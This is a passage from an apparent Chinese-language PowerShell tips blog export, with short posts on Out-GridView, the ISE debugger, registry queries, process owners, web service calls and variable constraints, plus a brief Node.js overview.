Active Directory cmdlet Get-ADUser 来查找当前禁用的用户，然后让 PowerShell 为您启用所有选中的用户。 或者显示一个有主窗口的进程（桌面应用），并且杀掉所有选中的进程。 如果想达到这个目的，您可能会期望 Out-GridView 禁止多选。要想只允许选择单条记录，请试试以下代码： PS&gt; 1..10 | Out-GridView -Title 'Pick favorite number' -OutputMode Single","link":"/2015/02/17/out-gridview-universal-dialog/"},{"title":"PowerShell 技能连载 - 将结果复制到剪贴板","text":"适用于 PowerShell 3.0 及以上版本 在前一个技能中我们介绍了如何简单地从 Out-GridView 的网格视图窗口中复制粘贴信息。不过这并不会复制列头。 您可以将这行代码加到任意命令中，并将它的结果复制到剪贴板中（包括列头）： PS&gt; Get-Service | Format-Table -AutoSize -Wrap | Out-String -Width 200 | clip.exe 当您运行完这行代码后，所有服务的清单就保存到剪贴板中了，接下来可以将内容粘贴到 Word 或其它接受文本输入的应用程序中。 请注意 Format-Table 和 Out-String 的用法：它们确保数据不会按照 PowerShell 控制台的边界来格式化。相反地，可用的宽度被设为设为 200 字符，如果结果仍比这个长，那么将会折行。 如果忽略掉这两个 cmdlet，然后查看一下结果：如果没有它们，文本将会输出到 PowerShell 控制台。过长的结果将会被截断。 为了简化操作，您可以将这行代码封装为一个简单的函数，例如： PS&gt; function Out-Clipboard { $input | Format-Table -AutoSize -Wrap | Out-String -Width 1000 | clip.exe } 现在，当您想将结果复制到剪贴板时，可以使用 Out-Clipboard： PS&gt; Get-Process | Out-Clipboard","link":"/2015/02/18/copying-results-to-clipboard-021815/"},{"title":"PowerShell 技能连载 - 进程终结器（和一些陷阱）","text":"适用于 PowerShell 3.0 及以上版本 在前一个技能中我们介绍了如何利用 Out-GridView 做一个选择对话框，并且提供了一些建议。一个点子是列出所有桌面应用，并且允许用户选择一个进程并终结它。 要列出所有桌面应用，请试试这段代码： PS&gt; Get-Process | Where-Object MainWindowTitle | Select-Object -Property Name, Description, MainWindowTitle, StartTime 这行代码对进程列表进行过滤并只列出设置了 MainWindowTitle 的进程。实际上，它返回了一个包含窗体的列表，忽略了所有不可见的后台进程。 接下来，将结果通过管道输出到 Out-GridView 并允许单选： PS&gt; Get-Process | Where-Object MainWindowTitle | Select-Object -Property Name, Description, MainWindowTitle, StartTime | Out-GridView -Title 'Kill Application' -OutputMode Single | Stop-Process -WhatIf 这行代码将打开一个网格视图窗口，显示所有运行中的进程。当您选中一个进程并点击“确定”按钮，将会杀掉该进程。不过，还差一点：这段示例代码包含了 -WhatIf 开关，所以只是 Stop-Process 只是模拟操作。 所以这是个好东西，因为您可能会注意到选择一个进程将会导致杀掉所有同名的进程。 这是由于 Stop-Process 可以接受两个不同的信息：名字（字符串），或是进程 ID (int)。由于这行代码使用了 Select-Object 来筛选属性，并且不包含进程 ID，所以 Stop-Process 将会使用进程名字，并杀掉所有同名的进程。 要实现杀除更具体的进程，请确保包含了进程的 ID： PS&gt; Get-Process | Where-Object MainWindowTitle | Select-Object -Property Name, Id, Description, MainWindowTitle, StartTime | Out-GridView -Title 'Kill Application' -OutputMode Single | Stop-Process -WhatIf","link":"/2015/02/19/process-killer-and-some-gotchas/"},{"title":"PowerShell 技能连载 - 在 ISE 中使用代码区域","text":"适用于 PowerShell 3.0 及以上版本 PowerShell ISE 已经支持了可折叠的代码区域。当您编写函数、循环，或是条件时，您也许会注意到在左边距的上方有一个“减号”符号。点击它可实现折叠该区域。 如果看不到区域特性，您可以这样启用它们：视图/显示大纲(区域)。 您也可以在脚本的其它部分使用区域和代码折叠。要将代码的任意部分包括在一个可折叠的区域内，请在代码中加入一些特殊的注释： #region Variable Declarations $a = $b = $c = 1 $d, $e, $f = 2,3,4 #endregion 请注意这些特殊的注释是大小写敏感的。在将区域折叠之后，”#region“ 后的文本将变为折叠区域的标题。","link":"/2015/02/20/using-code-regions-in-ise/"},{"title":"PowerShell 技能连载 - 使用 PowerShell ISE 调试器","text":"适用于 PowerShell 3.0 及以上版本 有些时候，很难找出 PowerShell 脚本为什么不按期望工作的原因。要更好地了解脚本工作的过程，请使用 PowerShell ISE 内置的调试器。 在您开始调试一个脚本之前请先保存它。无标题的脚本实际上还不算脚本，所以 PowerShell ISE 还无法调试它。 以下是调试一个脚本的简单步骤： 设置断点。断点是您希望调试器在代码中停下的位置，这样您可以检查当前变量的状态。要设置一个断点，请单击某一行，然后按下 F9 键。该行代码将会变成红色。如果该行未变红，说明您还没有保存该脚本，或是该行代码不包含可执行的代码。 运行脚本：脚本将会正常运行，但当运行到一个断点时，PowerShell ISE 将会暂停。当前行会标记成黄色。您可以将光标悬停到代码中的变量上来查看它们的值，或是在交互式窗口中执行任意代码，例如导出变量的值，甚至改变变量的值。 继续：要继续执行下一条指令，请按 F10 或 F11。F10 将执行当前作用域内的下一条指令。F11 将执行下一条指令，无论是哪个作用域。所以如果当前行将要执行一个函数，而您按下 F10，那么将执行整个函数。如果您按下 F11，那么您将执行到该函数的第一行。这有点像“一小步”的概念。 按下 F5 继续执行整个脚本。它将运行到整个脚本结束，或是遇到下一个断点。 按下 SHIFT+F5 退出执行过程并且停止调试器。 一旦您掌握了这些步骤，调试过程会变得十分容易。并且它可以给您带来许多领悟和帮助。如果不采用调试方法的话将很难调查脚本错误。","link":"/2015/02/23/using-the-powershell-ise-debugger/"},{"title":"PowerShell 技能连载 - 将文件的扩展名正常化","text":"适用于 PowerShell 2.0 及以上版本 假设您希望用户提交一个文件扩展名的列表，或者是从某些其它来源获取这个列表。 文件扩展名是模糊标准的绝好例子。您要如何指定一个文本文件的扩展名呢？是用 “.txt” 还是 “*.txt”？ 以下是一个将文件的扩展名正常化的简单技巧，无论它们如何拼写都有效： $extensions = '*.ps1', '.txt' $cleanExtensions = $extensions -replace '^\\.', '*.' $extensions $cleanExtensions","link":"/2015/02/24/normalizing-file-extensions/"},{"title":"PowerShell 技能连载 - 获取 DELL 保修信息（第二部分）","text":"适用于 PowerShell 2.0 及以上版本 在前一个技巧中我们演示了如何用一个 Web Service 来获取 DELL 电脑的保修信息。我们收到了许多反馈，所以在我们介绍新内容之前，先展示这段可以获取保修信息的代码： $serial = '36GPL41' $service = New-WebServiceProxy -Uri http://143.166.84.118/services/assetservice.asmx?WSDL $guid = [Guid]::NewGuid() $info = $service.GetAssetInformation($guid,'warrantycheck',$serial) $Entitlements = $info.Entitlements $Entitlements 现在，如果您试着将 $Entitlements 加到一个用户界面的文本框中，或者将它输出为文本，结果可能不是您想要的： PS&gt; &quot;Your Entitlements: $Entitlements&quot; Your Entitlements: Microsoft.PowerShell.Commands.NewWebserviceProxy.AutogeneratedTypes.WebServiceProxy1ervices_assetservice_asmx_WSDL.EntitlementData Microsoft.PowerShell.Commands.NewWebserviceProxy.AutogeneratedTypes.WebServiceProxy1ervices_assetservice_asmx_WSDL.EntitlementData Microsoft.PowerShell.Commands.NewWebserviceProxy.AutogeneratedTypes.WebServiceProxy1ervices_assetservice_asmx_WSDL.EntitlementData PS&gt; 这是因为 $Entitlements 是一个对象数组。当将它以文本方式显示时，我们希望 PowerShell 扩展类型系统能处理这些对象，所以将它们用 Out-String 处理一下： PS&gt; $EntitlementsText = $Entitlements | Out-String PS&gt; &quot;Your Entitlements: $EntitlementsText&quot; Your Entitlements: ServiceLevelCode : TS ServiceLevelDescription : P, ProSupport Provider : DELL StartDate : 23.03.2004 00:00:00 EndDate : 23.03.2007 00:00:00 DaysLeft : 0 EntitlementType : Expired ServiceLevelCode : ND ServiceLevelDescription : C, NBD ONSITE Provider : UNY StartDate : 23.03.2005 00:00:00 EndDate : 23.03.2007 00:00:00 DaysLeft : 0 EntitlementType : Expired ServiceLevelCode : ND ServiceLevelDescription : C, NBD ONSITE Provider : UNY StartDate : 23.03.2004 00:00:00 EndDate : 24.03.2005 00:00:00 DaysLeft : 0 EntitlementType : Expired","link":"/2015/02/25/getting-dell-warranty-information-part-2/"},{"title":"PowerShell 技能连载 - 简化命令提示符","text":"适用于 PowerShell 3.0 及以上版本 缺省情况下，PowerShell 的命令提示符中包含了当前路径。当您以一个普通用户启动 PowerShell 时，当前路径就是您的用户路径。那是一个很长的路径，会占用命令行很多空间。 最有效最简单的方法是将当前目录改为根目录： PS C:\\Users\\Tobias\\Documents&gt; cd \\ PS C:\\&gt; 或者，可以调整 prompt 函数，使它在其它地方显示当前路径，例如在标题栏： function prompt { 'PS&gt; ' $host.UI.RawUI.WindowTitle = Get-Location }","link":"/2015/02/26/shorten-the-prompt/"},{"title":"PowerShell 技能连载 - 使用数组作为参数的缺省值","text":"适用于 PowerShell 3.0 及以上版本 如果您定义的 PowerShell 函数有几个参数，并且希望某个参数的缺省值是一个数组，您可能会遇到语法问题： function Get-SomeData { param ( $ServerID = 1,2,5,10,11 ) &quot;Your choice: $ServerID&quot; } PowerShell 使用逗号来分隔参数，所以在 param() 块中的 “1” 之后的逗号会被曲解，PowerShell 会认为这是一个接下来定义的新参数。 当会发生歧义的时候，使用圆括号来确保这些部分是一个整体。以下是一段完美合法的代码： function Get-SomeData { param ( $ServerID = (1,2,5,10,11) ) &quot;Your choice: $ServerID&quot; }","link":"/2015/02/27/using-arrays-as-parameter-default-values/"},{"title":"PowerShell 技能连载 - 使用基于 JSON 的 Web Service","text":"适用于 PowerShell 3.0 及以上版本 Internet 有许多信息提供服务，许多返回的是 JSON 数据格式。以下是一个演示如何用 PowerShell 查询这类 Web Service，并将 JSON 结果转换为对象的例子。 这个例子使用一个德国铁路公司的 Web Service。您只要输入火车站或城市名字的一部分，就能得到包含输入信息的所有火车站名： # ask for part of the train station name $name = Read-Host 'Enter part of train station Name' # query webservice $url = &quot;http://openbahnapi.appspot.com/rest/stations/list?contains=$name&quot; $site = Invoke-WebRequest -Uri $url # get JSON result ($site.Content | ConvertFrom-Json ).value 结果看起来类似这样： PS&gt; Enter part of train station name: hanno Hannover Hbf HANNOVER MESSE Hannoversch Münden Hannover-Nordstadt Hannover Bismarckstr. Hannover Karl-Wiechert-Allee Hannover-Ledeburg Hannover-Linden/Fischerhof Hannover-Vinnhorst Hannover-Leinhausen Hannover Anderten-Misburg Hannover-Bornum PS&gt; 这段代码并不仅限于德国铁路系统，所以如果您不是对德国铁路系统特别兴趣的话，可以调用任何基于 JSON 的 Web Service。 重要的环节是 Invoke-WebRequest（该命令和 Web Service 通信并返回结果），以及 ConvertFrom-Json（该命令接收上一步的结果并将它转换为对象）。 请注意 Web Service 的提供者可能随时改变服务的实现。示例代码中的 Web Service 只能当做学习的例子来用。","link":"/2015/03/02/using-json-based-web-services/"},{"title":"PowerShell 技能连载 - 查找进程所有者","text":"适用于 PowerShell 3.0 及以上版本 Get-Process 能够返回所有运行中的进程，但是它并不包含进程所有者。要查看进程所有者，您需要采用调用 WMI 服务等方法。 要让使用过程更方便些，一下是一个小巧的工具函数： filter Get-ProcessOwner { $id = $_.ID $info = (Get-WmiObject -Class Win32_Process -Filter &quot;Handle=$id&quot;).GetOwner() if ($info.ReturnValue -eq 2) { $owner = '[Access Denied]' } else { $owner = '{0}\\{1}' -f $info.Domain, $info.User } $_ | Add-Member -MemberType NoteProperty -Name Owner -Value $owner -PassThru } 当您将进程对象通过管道传递给 Get-ProcessOwner 时，它为进程对象附加了一个新的 “Owner“ 属性。该属性是一个隐藏属性，要通过 Select-Object 才能显示： PS&gt; Get-Process -Id $pid | Get-ProcessOwner | Select-Object -Property Name, ID, Owner Name Id Owner ---- -- ----- powershell_ise 10080 TOBI2\\Tobias 它也适用于多个进程对象： PS&gt; Get-Process | Where-Object MainWindowTitle | Get-ProcessOwner | Select-Object -Property Name, ID, Owner Name Id Owner ---- -- ----- chrome 13028 TOBI2\\Tobias devenv 13724 TOBI2\\Tobias Energy Manager 6120 TOBI2\\Tobias ILSpy 14928 TOBI2\\Tobias (...) 请注意只有获得了管理员权限才可以获取进程所有者。如果没有货的管理员权限，您只能获得您自己进程的所有者，这样相对意义不大。","link":"/2015/03/03/finding-process-owner/"},{"title":"PowerShell 技能连载 - PowerShell ISE 自动化","text":"适用于 PowerShell 3.0 及以上版本 PowerShell ISE 是可以通过 $psISE 脚本化编程的。这个变量只在 PowerShell ISE 环境中有效。 要获得当前可见的脚本内容，请试试以下代码： PS&gt; $psise.CurrentFile.Editor.Text 这段代码可以实现一个简单的重命名方法，将 PowerShell ISE 当前打开的脚本中的 所有 “testserver” 替换成 “productionserver”（前提是在您当前的脚本代码中有一系列 “testserver” 字眼出现）： $psise.CurrentFile.Editor.Text = $psise.CurrentFile.Editor.Text -replace 'testserver', 'ProductionServer'","link":"/2015/03/04/automating-powershell-ise/"},{"title":"PowerShell 技能连载 - 播放 WAV 文件","text":"适用于 PowerShell 所有版本 以下是一个简单的用 PowerShell 播放 WAV 声音文件的方法： # find first available WAV file in Windows folder $WAVPath = Get-ChildItem -Path $env:windir -Filter *.wav -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName # load file and play it &quot;Playing $WAVPath...&quot; $player = New-Object Media.SoundPlayer $WAVPath $player.Play() &quot;Done!&quot; 这段脚本的第一部分在 Windows 文件夹中查找第一个 WAV 文件。当然，您可以将您喜欢的 WAV 文件路径赋给 $WAVFile。 下一步， Media.SoundPlayer 读取并播放 WAV 文件。请注意 Play() 如何播放声音：它在一个单独的线程中播放，而 PowerShell 将会立即继续运行。 您可以用这种方法来创建一个有声的进度条：当 PowerShell 在做某件事的时候持续播放声音： # find first available WAV file in Windows folder $WAVPath = Get-ChildItem -Path $env:windir -Filter *.wav -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName # load file and play it $player = New-Object Media.SoundPlayer $WAVPath $player.PlayLooping() 1..100 | ForEach-Object { Write-Progress -Activity 'Doing Something. Hang in' -Status $_ -PercentComplete $_ Start-Sleep -MilliSeconds (Get-Random -Minimum 300 -Maximum 1300) } $player.Stop() 现在，PlayLooping() 用于循环播放声音。该声音会一直播放下去，所以您需要手动调用 Stop()。这是脚本结束的时候需要做的事情。","link":"/2015/03/05/playing-wav-files-0/"},{"title":"PowerShell 技能连载 - 用 Finally 来处理关键的清理任务","text":"适用于 PowerShell 2.0 及以上版本 在前一个技能中我们介绍了一个“有声的进度条”，它能令 PowerShell 在忙时播放一段声音。以下还是那段代码： # find first available WAV file in Windows folder $WAVPath = Get-ChildItem -Path $env:windir -Filter *.wav -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName # load file and play it $player = New-Object Media.SoundPlayer $WAVPath $player.PlayLooping() 1..100 | ForEach-Object { Write-Progress -Activity 'Doing Something. Hang in' -Status $_ -PercentComplete $_ Start-Sleep -MilliSeconds (Get-Random -Minimum 300 -Maximum 1300) } $player.Stop() 这个脚本工作是正常的——除非您把它中断，例如按下 CTRL+C。如果按下这个组合键，脚本立即停止执行，并且 $player.Stop() 没有机会执行所以没有机会停止声音。 这就使用 PowerShell 中的 finally() 最为合适。它确保一个脚本退出前执行清理代码： # find first available WAV file in Windows folder $WAVPath = Get-ChildItem -Path $env:windir -Filter *.wav -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName # load file and play it $player = New-Object Media.SoundPlayer $WAVPath try { $player.PlayLooping() 1..100 | ForEach-Object { Write-Progress -Activity 'Doing Something' -Status $_ -PercentComplete $_ Start-Sleep -MilliSeconds (Get-Random -Minimum 300 -Maximum 1300) } } finally { $player.Stop() }","link":"/2015/03/06/using-finally-for-crucial-cleanup-tasks/"},{"title":"PowerShell 技能连载 - 检测 Wi-Fi 适配器和电源","text":"适用于 Windows 8.1/Server 2012 R2 Windows 8.1 和 Server 2012 R2 带来了一系列好用的网卡管理 cmdlet。例如当您希望调查 Wi-Fi 连接问题时，或是检查为什么 Wake-On-LAN 功能未能唤醒机器时，检查网卡电源管理设置就十分有意思了。 现在是小菜一碟了： PS&gt; Get-NetAdapter Name InterfaceDescription ifIndex Status ---- -------------------- ------- ----- Bluetooth-Netzwerkverb... Bluetooth-Gerät (PAN) 7 Di... WiFi Intel(R) Wireless-N 7260 3 Up PS&gt; Get-NetAdapter -Name WiFi Name InterfaceDescription ifIndex Status ---- -------------------- ------- ----- WiFi Intel(R) Wireless-N 7260 3 Up 只要您知道网卡的名称，那么查询它电源管理设置的方法是： PS&gt; Get-NetAdapter -Name WiFi | Get-NetAdapterPowerManagement InterfaceDescription : Intel(R) Wireless-N 7260 Name : WiFi ArpOffload : Enabled NSOffload : Enabled RsnRekeyOffload : Enabled D0PacketCoalescing : Enabled SelectiveSuspend : Unsupported DeviceSleepOnDisconnect : Disabled WakeOnMagicPacket : Enabled WakeOnPattern : Enabled 请注意您需要管理员权限来查看电源管理设置，否则会得到一个误导性的错误信息，提示设备工作不正常。","link":"/2015/03/09/examining-wi-fi-adapters-and-power-management/"},{"title":"PowerShell 技能连载 - 随时获取 cmdlet 的帮助","text":"适用于 PowerShell 3.0 及以上版本 从 PowerShell 3.0 开始，帮助文件不在随着 PowerShell 发布。相反，您需要通过 Update-Help 来下载它们，并且由于帮助文件是存储在（受保护的）PowerShell 文件夹中，所以一个普通用户无法实现该操作。 将来您需要某个 cmdlet 的帮助时，只需要直接使用在线版即可。以下代码将通过浏览器访问 Get-Process 的在线帮助（假设您有 Internet 连接）： PS&gt; help Get-Process -Online 安装了帮助文件之后，在 PowerShell ISE 中获得帮助变得更容易了：只需要点击任何 cmdlet 名称，然后按 F1 键。 如果仔细观察，会发现当按下 F1 时，实际上是帮您输入了帮助命令。所以如果需要同样的操作方便性，但是显示的是在线的帮助，您以实现一个类似这样的函数： function Get-Help($Name) { Get-Help $Name -Online } 然而，这可能会导致死循环，因为新创建的 Get-Help 会在内部调用自己。要让它正常工作，您需要您的函数内部是采用类似这样的方式调用原始的 Get-Help cmdlet： function Get-Help($Name) { Microsoft.PowerShell.Core\\Get-Help $Name -Online } 当您运行这个函数是，您可以点击 PowerShell ISE 中的任意 cmdlet 名称，然后按 F1 键，就能够访问该 cmdlet 的在线解释——忽略您本机安装的帮助文件。","link":"/2015/03/10/getting-cmdlet-help-no-matter-what/"},{"title":"Node.js 学习路线","text":"Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台， 用来方便地搭建快速的易于扩展的网络应用。Node.js 借助事件驱动，非阻塞 I/O 模型变得轻量和高效，非常适合运行在分布式设备的数据密集型的实时应用。 V8 引擎执行 JavaScript 的速度非常快，性能非常好。Node 对一些特殊用例进行了优化，提供了替代的 API，使得 V8 在非浏览器环境下运行得更好。 Node 是 一个 JavasSript 运行环境 (runtime)。实际上它是对 Google V8 引擎进行了封装。V8 引擎执行JavaScript 的速度非常快，性能非常好。Node 对一些特殊用例进行了优化，提供了替代的 API，使得 V8 在非浏览器环境下运行得更好。 网站 官方网站：Node.js 中文社区：CNode：Node.js专业中文社区 技巧 快速搭建 Node.js 开发环境以及加速 npm - CNode","link":"/2015/03/11/Node-js-Guideline/"},{"title":"PowerShell 技能连载 - 禁止确认信息","text":"适用于 PowerShell 所有版本 某些 cmdlet（例如 Remove-ADGroupMember）会自动提示确认信息。这在无人值守的脚本中会有问题。 要禁用这些不需要的确认对话框，请显式将 -Confirm 开关参数设置为 false： Remove-ADGroupMember -Identity 'Domain Admins' -Members user12 -Confirm:$false 或者，您可以修改安全级别。PowerShell 将会自动读取该设置。这行代码将所有 cmdlet 的自动确认关闭： $ConfirmPreference = 'None' 请注意两个技能都只对缺省的确认对话框有效。如果一个 cmdlet 以 PowerShell 确认框架之外的方式提示确认，您需要参阅 cmdlet 的文档来查找如何禁止它的方法。","link":"/2015/03/11/suppress-confirmation/"},{"title":"PowerShell 技能连载 - 展开对象数据结构","text":"适用于 PowerShell 3.0 及以上版本 对象有可能包含嵌套的属性，您所关心的数据可能在一个对象中的“某个地方”。 要显示某个对象的所有属性和展开后的子属性，可将它转换为 JSON。这能很好地以文本的方式展现嵌套的属性。 这个例子获取当前的 PowerShell 进程，然后将它转化为 JSON，然后将文本输出到剪贴板。然后就可以将内容粘贴到任意的文本编辑器： Get-Process -Id $pid | ConvertTo-Json | clip.exe 要控制递归的深度，请使用 ConvertTo-Json 命令的 -Depth 参数。缺省值是 2（所以最多显示 2 层递归深度的内容）。","link":"/2015/03/12/unfolding-object-data-structure/"},{"title":"PowerShell 技能连载 - 检查网站的响应（和执行时间）","text":"适用于 PowerShell 3.0 及以上版本 有些时候了解一个命令的执行时间是十分重要的。例如，要监控网站的响应时间，您可以使用 Invoke-WebRequest。用 Measure-Command 来测量执行的耗时。 $url = 'http://www.powershell.com' # track execution time: $timeTaken = Measure-Command -Expression { $site = Invoke-WebRequest -Uri $url } $milliseconds = $timeTaken.TotalMilliseconds $milliseconds = [Math]::Round($milliseconds, 1) &quot;This took $milliseconds ms to execute&quot; 它返回一个 TimeSapn 对象，该对象包含了一个 “TotalMilliseconds“ 属性。使用 “Math“ 类提供的 Round() 方法将结果四舍五入。在这例子中，毫秒值被精确到小数点后 1 位。","link":"/2015/03/13/measuring-website-response-and-execution-times/"},{"title":"PowerShell 技能连载 - 用 PowerShell 打开网页","text":"适用于 PowerShell 所有版本 假设您希望每天开始时，就用浏览器打开您最喜欢的网站。PowerShell 可以简单地实现这个需求。不过，这要看您是否喜欢自动打开网页。 使用 Start-Process 的时候，您可以通过参数指定选用哪个浏览器，以及提交的 URL 地址： # starts with a specific browser Start-Process -FilePath iexplore -ArgumentList www.powershellmagazine.com 这将在 Internet Explorer 中打开网站，而不是选用缺省的浏览器设置。 不过，它总是打开一个新的浏览器实例。请看另一种实现方式： # starts with default browser and adds to open browser Start-Process -FilePath www.tagesschau.de 这段代码中，我们将一个 URL 当做一个“可执行程序”，Windows 就会使用缺省的浏览器。如果缺省浏览器已经打开了，将在其中打开一个新的标签页，而不是打开一个新的浏览器窗口。 要让 PowerShell 在启动时自动打开网页，请确保 $profile 指向的文件路径存在。下一步，打开该脚本，并添加启动命令。","link":"/2015/03/16/opening-webpages-from-powershell/"},{"title":"PowerShell 技能连载 - 根据类型对数据排序","text":"适用于 PowerShell 所有版本 Sort-Object 是一站式的排序解决方案。如果要对简单数据类型排序，只需要将它通过管道传递给 Sort-Object。如果要对复杂数据类型排序，则需要指定排序所使用的属性： # sorting primitive data 1,5,2,1,6,3,12,6 | Sort-Object -Unique # sorting object data Get-ChildItem -Path c:\\windows | Sort-Object –Property name 由于对象的天生原因，PowerShell 自动选择排序的算法。但如果您需要更多的控制呢？ 只需要传入一个代码块。在代码块中，$_ 代表需要排序的对象。您可以将它转型为任何期望的类型： # sorting string as numbers '1','5','3a','12','6' | Sort-Object -Property { $_ -as [int] } # sorting IPv4 addresses as versions '1.2.3.4', '10.1.2.3', '100.4.2.1', '2.3.4.5', '9.10.11.12' | Sort-Object -Property { [version] $_ }","link":"/2015/03/17/sort-things-with-type/"},{"title":"PowerShell 技能连载 - 从注册表中读取文件扩展名关联（第一部分）","text":"适用于 PowerShell 所有版本 PowerShell 代码可以写得十分紧凑。以下是一个从 Windows 注册表中读取所有文件扩展名关联的单行代码： Get-ItemProperty Registry::HKCR\\.* | Select-Object -Property PSChildName, '(default)', ContentType, PerceivedType 请注意这些技巧：Get-ItemProperty 使用了名为“Registry::”的 provider，而不是 PowerShell 提供的注册表驱动器。通过这种方式，您可以使用默认的注册表路径，并且可以存取类似 HKEY_CLASSES_ROOT 这样没有驱动器的 hive。 请注意 Select-Object 如何选择获取注册表值。这里有两个特殊的名字：“(default)”总是代表缺省的注册表值，并且“PSChildName”总是代表当前读取的注册表键名。 由于路径名中的“*”符，该命令将自动读取 HKCR 路径中以点开头的所有键。","link":"/2015/03/18/reading-associated-file-extensions-from-registry/"},{"title":"PowerShell 技能连载 - 从注册表中读取文件扩展名关联（第二部分）","text":"适用于 PowerShell 所有版本 在前一个技能里您已学到了如何用单行代码读取多个注册表键。在第二部分中，请试试这段单行代码： $lookup = Get-ItemProperty Registry::HKCR\\.[a-f]?? | Select-Object -Property PSChildName, '(default)', ContentType, PerceivedType | Group-Object -Property PSChildName -AsHashTable -AsString 这段代码读取注册表 HKCR 中所有以点开头，接下来是三个字母，并且第一个字母必须是 a-f 的键——它的作用是读取所有以 a-f 开头，并且必须是 3 个字符的文件扩展名。 另外，结果通过管道输出到 Group-Object，并且“PSChildName”属性被用作哈希表的键名。 PSChildName 总是返回注册表的键名，在这个例子中代表的是文件的扩展名。 当您运行这行代码时，您可以查询任何已注册的文件扩展名： PS&gt; $lookup.'.avi' PSChildName (default) ContentType PerceivedType ----------- --------- ----------- ------------- .avi WMP11.AssocFile.AVI video PS&gt; $lookup.'.fon' PSChildName (default) ContentType PerceivedType ----------- --------- ----------- ------------- .fon fonfile 请注意这行代码限制了只包括 a-f 开头、三个字母的扩展名。要获取所有的文件扩展名，请使用这个路径： Registry::HKCR\\.*","link":"/2015/03/19/reading-associated-file-extensions-from-registry-part-2/"},{"title":"PowerShell 技能连载 - 从注册表中读取用户配置文件","text":"适用于 PowerShell 所有版本 要查看哪个用户在您的机器上拥有（本地）配置文件，以及配置文件位于什么位置，请使用这段代码： $path = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\*' Get-ItemProperty -Path $path | Select-Object -Property PSChildName, ProfileImagePath 它将自动枚举配置文件列表中的所有键，并返回用户 SID 和配置文件的路径： PSChildName ProfileImagePath ----------- ---------------- S-1-5-18 C:\\WINDOWS\\system32\\config\\systemprofile S-1-5-19 C:\\Windows\\ServiceProfiles\\LocalService S-1-5-20 C:\\Windows\\ServiceProfiles\\NetworkSer... S-1-5-21-1907506615-3936657230-268413... C:\\Users\\Tobias S-1-5-80-3880006512-4290199581-164872... C:\\Users\\MSSQL$SQLEXPRESS","link":"/2015/03/20/read-user-profiles-from-registry/"},{"title":"PowerShell 技能连载 - 在 PowerShell ISE 中使用“more”","text":"适用于 PowerShell ISE 在 PowerShell 控制台中，您可以将命令通过管道输出到旧式的“more.com”命令中，或者更高级一些的 Out-Host -Paging 中。这将分页显示数据，每按一个键翻一页： PS&gt; Get-Process | more PS&gt; Get-Process | Out-Host -Paging 在 PowerShell ISE 中，这些都不支持。这是因为 ISE 没有控制台，所以没有“可见的行数”概念，只有一个无限的文本缓冲区。 要避免大量的结果刷屏问题，只需要自己创建一个兼容 ISE 的“more”命令： function Out-More { param ( $Lines = 10, [Parameter(ValueFromPipeline=$true)] $InputObject ) begin { $counter = 0 } process { $counter++ if ($counter -ge $Lines) { $counter = 0 Write-Host 'Press ENTER to continue' -ForegroundColor Yellow Read-Host } $InputObject } } 将您的结果通过管道输出到 Out-More，命令，并使用 -Lines 来指定接收到多少行以后暂停： PS&gt; Get-Process | Out-More -Lines 4 Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName ------- ------ ----- ----- ----- ------ -- ----------- 100 9 1436 1592 51 6896 adb 307 42 22332 12940 123 1424 AllShareFrameworkDMS 42 4 1396 1284 19 1404 AllShareFrameworkManagerDMS Press ENTER to continue 81 7 1004 724 43 1388 armsvc 202 25 50376 55320 234 8,06 13720 chrome 1131 65 68672 93892 361 116,73 13964 chrome 199 24 53008 52700 225 5,56 14768 chrome Press ENTER to continue 248 26 31348 44984 239 44,31 15404 chrome 173 20 23756 25540 179 1,27 16492 chrome 190 22 36316 39208 207 2,81 16508 chrome 184 23 41800 44212 223 1,77 17244 chrome Press ENTER to continue","link":"/2015/03/23/using-more-in-the-powershell-ise/"},{"title":"PowerShell 技能连载 - 在脚本中包含资源","text":"适用于 PowerShell 3.0 及以上版本 如果您的脚本需要额外的资源，比如说服务器名列表，图片文件，或是其它内容，那么请确保您的脚本可随处使用。 千万别使用绝对路径来定位资源文件。应使用 PowerShell 3.0 开始提供的 $PSScriptRoot（在 PowerShell 2.0 中，$PSScriptRoot 只能在模块中使用）。 $picture = &quot;$PSScriptRoot\\Resources\\picture.png&quot; Test-Path -Path $picture $data = &quot;$PSScriptRoot\\Resources\\somedata.txt&quot; Get-Content -Path $data $PSScriptRoot 总是指向脚本所在的目录（所以如果脚本尚未保存或是以交互式查询该变量，得到的结果是空）。","link":"/2015/03/24/including-resources-with-your-scripts/"},{"title":"PowerShell 技能连载 - 使用常量","text":"适用于 PowerShell 所有版本 PowerShell 中的变量是不稳定的。您可以覆盖或是删除它们——除非创建常量。 常量只能在还不存在该常量的时候创建。这行代码创建了一个名为“_connotChange_”，值为 1 的常量。 New-Variable -Name cannotChange -Value 1 -Option Constant 在 PowerShell 运行期间，无法删除这个变量。该变量被绑定到当前的 PowerShell 会话。常量可以用在您不希望改变的敏感信息上。 您可以在您的主配置文件路径上定义常量，例如： PS&gt; $profile.AllUsersAllHosts C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1 如果该文件存在，PowerShell 将会在任何实例启动之前先执行它。如果您在此定义了常量——例如您的公司名、重要的服务器列表等——该信息将在所有 PowerShell 宿主内有效，而且无法被覆盖。","link":"/2015/03/25/using-constants/"},{"title":"PowerShell 技能连载 - 只读及强类型变量","text":"适用于 PowerShell 所有版本 要让 PowerShell 脚本更鲁棒，您可以针对脚本变量编写一系列约束条件。 这么做的效果是，PowerShell 将会为您监控这些约束条件，并且如果某些条件不满足，将抛出错误。 第一个约束条件是传入的数据类型必须和期望的相符。将数据类型放在方括号中，然后将它放在变量前面。这将会使一个通用类型的变量转换为一个强类型的变量。 PS&gt; $profile.AllUsersAllHosts C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1 PS&gt; [int]$ID = 12 PS&gt; $ID = 17 PS&gt; $ID = '19' PS&gt; $ID = 'wrong' Cannot convert type &quot;string&quot;... 请看 $ID 变量是如何成为一个只能存储 Integer 数据的变量。望您将一个非 Integer 值，（例如 ‘19’）传入时，它将自动转换成 Integer 类型。如果无法转换（例如 ‘wrong’），PowerShell 将会抛出一个错误。 